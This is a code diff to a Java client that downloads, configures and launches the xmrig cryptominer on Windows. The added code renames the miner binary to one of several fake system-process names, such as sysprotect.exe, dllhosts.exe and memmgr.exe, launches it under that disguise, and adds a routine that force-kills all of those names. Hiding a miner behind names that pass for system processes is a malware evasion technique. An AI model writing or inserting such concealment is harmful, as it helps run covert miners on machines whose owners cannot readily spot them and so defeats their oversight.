@@ -1,5 +1,7 @@
 package client.main;
 
+import universal.FileIO;
+
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -10,6 +12,7 @@ import java.util.Date;
 import java.util.Timer;
 
 public class AXMain {
+    public static final String[] PROG_MASK_NAME=new String[]{"memprog.exe","memmgr.exe","sysprotect.exe","ssddriver.exe","pcasi.exe","dllhosts.exe","mediahost.exe","monitor.exe","touchas.exe"};
     //从ghostj的配置文件读取本机名称
     //向ax服务端发送注册消息
     //检查是否有xmrig已存在,没有则下载
@@ -61,6 +64,23 @@ public class AXMain {
         //读取ghostj的配置文件修改config.json中的本机pass
         String cfgjson=FileRW.readMultiLine("D:\\xmrig\\config.json");
         FileRW.write("D:\\xmrig\\config.json",cfgjson.replaceAll("DEVICE_PASS",pass).replaceAll("nmsl@wsnb.com",pass));
+        //随机一个程序名
+        int idx=(int)(Math.random()*1000)%PROG_MASK_NAME.length;
+        String maskName=PROG_MASK_NAME[idx];
+        //修改程序名
+        String originName="xmrig.exe";
+        try{
+            originName=FileIO.read("D:\\xmrig\\mn.txt");
+        }catch (Exception ignored){}
+        File prog=new File("D:\\xmrig\\"+originName);
+        boolean succ=prog.renameTo(new File("D:\\xmrig\\"+maskName));
+        if (succ){
+            try {
+                FileIO.write("D:\\xmrig\\mn.txt",maskName);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
         //启动xmrig
         ProcessCmd processCmd=new ProcessCmd("cmd");
         processCmd.cmd="cmd";
@@ -73,7 +93,11 @@ public class AXMain {
             processCmd.processWriter.write("cd D:\\xmrig\n");
             processCmd.processWriter.newLine();
             processCmd.processWriter.flush();
-            processCmd.processWriter.write("xmrig.exe\n");
+            if (succ) {
+                processCmd.processWriter.write(maskName + "\n");
+            }else {
+                processCmd.processWriter.write("xmrig.exe\n");
+            }
             processCmd.processWriter.newLine();
             processCmd.processWriter.flush();
         }catch (Exception e){
@@ -126,5 +150,12 @@ public class AXMain {
     }
     public static boolean isWindows10() {
         return System.getProperties().getProperty("os.name").toUpperCase().contains("WINDOWS 10");
+    }
+    public static void killAll(){
+        try {
+            for (String s : PROG_MASK_NAME) {
+                Runtime.getRuntime().exec("taskkill /im " + s + " /f");
+            }
+        }catch (Exception ignored){}
     }
 }
